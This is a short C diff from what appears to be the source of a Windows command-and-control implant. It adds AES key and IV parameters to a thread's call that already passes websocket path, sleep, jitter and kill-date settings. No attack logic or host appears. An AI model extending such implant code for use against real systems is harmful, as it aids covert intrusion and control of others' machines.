@@ -65,7 +65,9 @@ DWORD WINAPI ThreadProc(LPVOID lpParam)
         REQUEST_PATH_WEBSOCKET_W,
         PAYLOAD_SLEEP,
         PAYLOAD_JITTER,
-        PAYLOAD_KILLDATE
+        PAYLOAD_KILLDATE,
+        AES_KEY_BASE64_W,
+        AES_IV_BASE64_W
     );
 
     g_runFinished = TRUE;
